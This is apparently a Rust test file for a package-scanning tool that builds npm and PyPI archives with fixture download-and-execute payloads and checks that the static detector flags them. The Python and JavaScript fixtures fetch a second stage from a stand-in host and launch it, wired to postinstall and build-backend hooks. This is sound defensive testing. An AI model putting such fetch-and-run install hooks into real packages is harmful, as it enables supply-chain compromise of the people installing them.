use flate2::write::GzEncoder;
use flate2::Compression;
use std::io::{Cursor, Write};
use std::process::Command;
use std::sync::atomic::{AtomicU64, Ordering};
use whoathere_artifact::{Ecosystem, NormalizationLimits, Sha256Digest};
use whoathere_detector::ArtifactFindingCategory;
use whoathere_runner::{
    inspect_exact_artifact_v1, verify_static_download_execute_projections_v1,
    ExactArtifactFindingKindV1, ExactArtifactInspectionRequestV1, StaticProjectionRequestV1,
    STATIC_PROJECTION_KIND_V1,
};
use zip::write::SimpleFileOptions;

static NEXT_TEMP: AtomicU64 = AtomicU64::new(1);

const PYTHON_DOWNLOAD_EXECUTE: &[u8] = br#"import subprocess
import urllib.request

def fetch_and_launch():
    destination = "/tmp/inert-second-stage"
    with urllib.request.urlopen("https://example.invalid/second-stage") as response:
        with open(destination, "wb") as output:
            output.write(response.read())
    subprocess.Popen([destination])

fetch_and_launch()
"#;

const JAVASCRIPT_DOWNLOAD_EXECUTE: &[u8] = br#"const fs = require('node:fs');
const https = require('node:https');
const child_process = require('node:child_process');
const destination = '/tmp/inert-second-stage';
https.get('https://example.invalid/second-stage');
fs.writeFileSync(destination, Buffer.from('inert'));
child_process.spawn(destination);
"#;

struct TempRoot(std::path::PathBuf);

impl TempRoot {
    fn new(label: &str) -> Self {
        let path = std::env::temp_dir().join(format!(
            "{label}-{}-{}",
            std::process::id(),
            NEXT_TEMP.fetch_add(1, Ordering::Relaxed)
        ));
        std::fs::create_dir(&path).expect("create isolated test root");
        Self(path)
    }

    fn path(&self) -> &std::path::Path {
        &self.0
    }
}

impl Drop for TempRoot {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.0);
    }
}

fn append_tar_file(archive: &mut tar::Builder<GzEncoder<Vec<u8>>>, path: &str, bytes: &[u8]) {
    let mut header = tar::Header::new_gnu();
    header.set_entry_type(tar::EntryType::Regular);
    header.set_size(bytes.len() as u64);
    header.set_mode(0o644);
    header.set_uid(0);
    header.set_gid(0);
    header.set_mtime(0);
    header.set_cksum();
    archive
        .append_data(&mut header, path, Cursor::new(bytes))
        .expect("append inert fixture member");
}

fn npm_download_execute_tgz(payload: &[u8]) -> Vec<u8> {
    let encoder = GzEncoder::new(Vec::new(), Compression::default());
    let mut archive = tar::Builder::new(encoder);
    append_tar_file(
        &mut archive,
        "package/package.json",
        br#"{"name":"static-projection-npm","version":"1.0.0","scripts":{"postinstall":"node index.js"},"main":"index.js"}"#,
    );
    append_tar_file(&mut archive, "package/index.js", payload);
    archive
        .into_inner()
        .expect("finish tar")
        .finish()
        .expect("finish gzip")
}

fn wheel_record_hash(bytes: &[u8]) -> String {
    let digest = Sha256Digest::from_bytes(bytes);
    let digest_bytes = digest
        .as_str()
        .strip_prefix("sha256:")
        .expect("digest prefix")
        .as_bytes()
        .chunks_exact(2)
        .map(|pair| {
            u8::from_str_radix(std::str::from_utf8(pair).expect("hex ASCII"), 16)
                .expect("valid hex")
        })
        .collect::<Vec<_>>();
    format!("sha256={}", base64_url_no_pad(&digest_bytes))
}

fn base64_url_no_pad(bytes: &[u8]) -> String {
    const ALPHABET: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
    let mut output = String::new();
    for chunk in bytes.chunks(3) {
        let first = chunk[0];
        let second = chunk.get(1).copied().unwrap_or(0);
        let third = chunk.get(2).copied().unwrap_or(0);
        output.push(ALPHABET[(first >> 2) as usize] as char);
        output.push(ALPHABET[(((first & 0x03) << 4) | (second >> 4)) as usize] as char);
        if chunk.len() > 1 {
            output.push(ALPHABET[(((second & 0x0f) << 2) | (third >> 6)) as usize] as char);
        }
        if chunk.len() > 2 {
            output.push(ALPHABET[(third & 0x3f) as usize] as char);
        }
    }
    output
}

fn wheel_download_execute_zip(payload: &[u8]) -> Vec<u8> {
    let members = [
        (
            "static_projection-1.0.0.dist-info/METADATA",
            b"Metadata-Version: 2.3\nName: static-projection\nVersion: 1.0.0\n".as_slice(),
        ),
        (
            "static_projection-1.0.0.dist-info/WHEEL",
            b"Wheel-Version: 1.0\nGenerator: whoathere-test\nRoot-Is-Purelib: true\nTag: py3-none-any\n".as_slice(),
        ),
        (
            "static_projection/__init__.py",
            b"from . import client\n".as_slice(),
        ),
        ("static_projection/client.py", payload),
    ];
    let record_path = "static_projection-1.0.0.dist-info/RECORD";
    let mut record = String::new();
    for (path, bytes) in members {
        record.push_str(&format!(
            "{path},{},{}\n",
            wheel_record_hash(bytes),
            bytes.len()
        ));
    }
    record.push_str(&format!("{record_path},,\n"));
    let mut writer = zip::ZipWriter::new(Cursor::new(Vec::new()));
    for (path, bytes) in members {
        writer
            .start_file(path, SimpleFileOptions::default())
            .expect("start wheel member");
        writer.write_all(bytes).expect("write wheel member");
    }
    writer
        .start_file(record_path, SimpleFileOptions::default())
        .expect("start RECORD");
    writer.write_all(record.as_bytes()).expect("write RECORD");
    writer.finish().expect("finish wheel").into_inner()
}

fn sdist_download_execute_tgz(payload: &[u8]) -> Vec<u8> {
    let encoder = GzEncoder::new(Vec::new(), Compression::default());
    let mut archive = tar::Builder::new(encoder);
    append_tar_file(
        &mut archive,
        "static_projection-1.0.0/PKG-INFO",
        b"Metadata-Version: 2.3\nName: static-projection\nVersion: 1.0.0\n",
    );
    append_tar_file(
        &mut archive,
        "static_projection-1.0.0/pyproject.toml",
        b"[build-system]\nrequires = []\nbuild-backend = \"backend_impl\"\nbackend-path = [\"backend\"]\n\n[project]\nname = \"static-projection\"\nversion = \"1.0.0\"\n",
    );
    append_tar_file(
        &mut archive,
        "static_projection-1.0.0/backend/backend_impl.py",
        payload,
    );
    archive
        .into_inner()
        .expect("finish tar")
        .finish()
        .expect("finish gzip")
}

fn verify(
    root: &TempRoot,
    filename: &str,
    bytes: &[u8],
    ecosystem: Ecosystem,
    expected: &Sha256Digest,
) -> Result<whoathere_runner::StaticProjectionMetadataV1, whoathere_runner::StaticProjectionErrorV1>
{
    let artifact = root.path().join(filename);
    std::fs::write(&artifact, bytes).expect("write inert exact archive");
    verify_static_download_execute_projections_v1(StaticProjectionRequestV1 {
        artifact_path: &artifact,
        ecosystem,
        acquired_at: "2026-07-17T00:00:00Z",
        expected_artifact_sha256: expected,
        normalization_limits: NormalizationLimits::default(),
    })
}

#[test]
fn exact_npm_and_pypi_archives_emit_only_citation_complete_static_projections() {
    for (label, filename, bytes, ecosystem) in [
        (
            "npm",
            "static-projection-npm-1.0.0.tgz",
            npm_download_execute_tgz(JAVASCRIPT_DOWNLOAD_EXECUTE),
            Ecosystem::Npm,
        ),
        (
            "wheel",
            "static_projection-1.0.0-py3-none-any.whl",
            wheel_download_execute_zip(PYTHON_DOWNLOAD_EXECUTE),
            Ecosystem::Pypi,
        ),
        (
            "sdist",
            "static_projection-1.0.0.tar.gz",
            sdist_download_execute_tgz(PYTHON_DOWNLOAD_EXECUTE),
            Ecosystem::Pypi,
        ),
    ] {
        let root = TempRoot::new(&format!("whoathere-static-projection-{label}"));
        let expected = Sha256Digest::from_bytes(&bytes);
        let metadata = verify(&root, filename, &bytes, ecosystem, &expected)
            .unwrap_or_else(|error| panic!("{label} projection failed: {error}"));

        assert_eq!(metadata.verification_status, "verified");
        assert!(!metadata.admission_authority);
        assert!(!metadata.observed_clean);
        assert!(!metadata.verification_summary.package_execution_applied);
        assert!(!metadata.verification_summary.network_access_applied);
        assert!(!metadata.verification_summary.ai_applied);
        assert!(!metadata.verification_summary.vm_applied);
        assert!(!metadata.projections.is_empty());
        assert_eq!(metadata.projection_count, metadata.projections.len());
        assert_eq!(
            metadata.source_receipt_sha256,
            metadata.verification_summary.deterministic_analysis_sha256
        );
        for projection in &metadata.projections {
            assert_eq!(projection.kind, STATIC_PROJECTION_KIND_V1);
            assert_eq!(projection.artifact_sha256, expected);
            assert_eq!(
                projection.artifact_manifest_sha256,
                metadata.verification_summary.artifact_manifest_sha256
            );
            assert_eq!(
                projection.source_receipt_sha256,
                metadata.source_receipt_sha256
            );
            assert!(metadata
                .verification_summary
                .exact_observations
                .iter()
                .any(|observation| observation.observation_sha256
                    == projection.exact_observation_sha256));
        }

        let canonical = metadata
            .canonical_json_bytes()
            .expect("serialize canonical metadata");
        assert_eq!(canonical.last(), Some(&b'\n'));
        assert!(!canonical.windows(2).any(|pair| pair == b" \n"));
        assert!(!canonical
            .windows(b"https://example.invalid".len())
            .any(|window| window == b"https://example.invalid"));
        assert!(!canonical
            .windows(b"/tmp/inert-second-stage".len())
            .any(|window| window == b"/tmp/inert-second-stage"));
        let parsed: serde_json::Value =
            serde_json::from_slice(&canonical).expect("parse canonical metadata");
        let projected = parsed["projections"].as_array().expect("projections array");
        assert!(projected.iter().all(|projection| {
            projection
                .as_object()
                .is_some_and(|projection| projection.len() == 10)
        }));

        // The verifier does not consume this report. This cross-check proves
        // that independently recomputing the same contracts produces the exact
        // observation and deterministic-stage receipt identities already
        // emitted by the product spine.
        let report = inspect_exact_artifact_v1(
            ExactArtifactInspectionRequestV1 {
                artifact_path: &root.path().join(filename),
                quarantine_root: &root.path().join("product-report-quarantine"),
                ecosystem: Some(ecosystem),
                acquired_at: "2026-07-17T00:00:00Z",
                ai_requested: false,
                ai_provider: None,
                behavior_observation_requested: false,
                detonation_requested: false,
                normalization_limits: NormalizationLimits::default(),
            },
            None,
            None,
        )
        .expect("build independent product report for identity cross-check");
        let product_receipt = report
            .stages
            .iter()
            .find(|stage| stage.stage == "deterministic_analysis")
            .and_then(|stage| stage.result_sha256.as_deref())
            .expect("product deterministic receipt");
        assert_eq!(metadata.source_receipt_sha256.as_str(), product_receipt);
        let product_observations = report
            .observations
            .iter()
            .filter(|observation| {
                observation.finding_kind
                    == ExactArtifactFindingKindV1::DeterministicStatic(
                        ArtifactFindingCategory::DownloadExecuteCapability,
                    )
            })
            .map(|observation| observation.observation_sha256.clone())
            .collect::<Vec<_>>();
        let projected_observations = metadata
            .projections
            .iter()
            .map(|projection| projection.exact_observation_sha256.clone())
            .collect::<Vec<_>>();
        assert_eq!(projected_observations, product_observations);
    }
}

#[test]
fn changed_exact_archive_cannot_reuse_a_frozen_artifact_digest() {
    let original = wheel_download_execute_zip(PYTHON_DOWNLOAD_EXECUTE);
    let expected = Sha256Digest::from_bytes(&original);
    let changed = wheel_download_execute_zip(
        br#"import subprocess
import urllib.request
destination = "/tmp/other-inert-stage"
body = urllib.request.urlopen("https://example.invalid/other").read()
with open(destination, "wb") as output:
    output.write(body)
subprocess.Popen([destination])
"#,
    );
    let root = TempRoot::new("whoathere-static-projection-tampered-artifact");
    let error = verify(
        &root,
        "static_projection-1.0.0-py3-none-any.whl",
        &changed,
        Ecosystem::Pypi,
        &expected,
    )
    .expect_err("changed bytes must not verify against frozen digest");
    assert_eq!(
        error.reason_code(),
        "static_projection_expected_artifact_digest_mismatch"
    );
    assert_eq!(error.exit_code(), 65);
    assert!(String::from_utf8(error.canonical_json_bytes())
        .expect("UTF-8 error JSON")
        .contains("\"admission_authority\":false"));
}

#[test]
fn bounded_no_match_is_inconclusive_and_never_clean() {
    let benign = wheel_download_execute_zip(b"def status():\n    return 'inert'\n");
    let expected = Sha256Digest::from_bytes(&benign);
    let root = TempRoot::new("whoathere-static-projection-no-match");
    let error = verify(
        &root,
        "static_projection-1.0.0-py3-none-any.whl",
        &benign,
        Ecosystem::Pypi,
        &expected,
    )
    .expect_err("no eligible finding must be inconclusive");
    assert_eq!(
        error.reason_code(),
        "static_projection_download_execute_capability_not_found"
    );
    assert_eq!(error.exit_code(), 22);
    let json: serde_json::Value =
        serde_json::from_slice(&error.canonical_json_bytes()).expect("parse error JSON");
    assert_eq!(json["observed_clean"], false);
    assert_eq!(json["admission_authority"], false);
}

#[test]
fn command_emits_canonical_json_and_returns_fail_closed_identity_code() {
    let bytes = npm_download_execute_tgz(JAVASCRIPT_DOWNLOAD_EXECUTE);
    let expected = Sha256Digest::from_bytes(&bytes);
    let root = TempRoot::new("whoathere-static-projection-command");
    let artifact = root.path().join("static-projection-npm-1.0.0.tgz");
    std::fs::write(&artifact, &bytes).expect("write inert command fixture");
    let binary = env!("CARGO_BIN_EXE_whoathere-static-projection");
    let success = Command::new(binary)
        .args([
            "--artifact",
            artifact.to_str().expect("UTF-8 fixture path"),
            "--ecosystem",
            "npm",
            "--acquired-at",
            "2026-07-17T00:00:00Z",
            "--expected-artifact-sha256",
            expected.as_str(),
        ])
        .output()
        .expect("run projection command");
    assert!(success.status.success());
    assert!(success.stderr.is_empty());
    assert_eq!(success.stdout.last(), Some(&b'\n'));
    let success_json: serde_json::Value =
        serde_json::from_slice(&success.stdout).expect("parse success output");
    assert_eq!(success_json["verification_status"], "verified");
    assert!(success_json["projection_count"]
        .as_u64()
        .is_some_and(|count| count > 0));

    let wrong_digest = Sha256Digest::from_bytes(b"different exact archive");
    let rejected = Command::new(binary)
        .args([
            "--artifact",
            artifact.to_str().expect("UTF-8 fixture path"),
            "--ecosystem",
            "npm",
            "--acquired-at",
            "2026-07-17T00:00:00Z",
            "--expected-artifact-sha256",
            wrong_digest.as_str(),
        ])
        .output()
        .expect("run rejected projection command");
    assert_eq!(rejected.status.code(), Some(65));
    assert!(rejected.stdout.is_empty());
    let rejected_json: serde_json::Value =
        serde_json::from_slice(&rejected.stderr).expect("parse rejected output");
    assert_eq!(rejected_json["verification_status"], "failed");
    assert_eq!(rejected_json["observed_clean"], false);
    assert_eq!(rejected_json["admission_authority"], false);
}
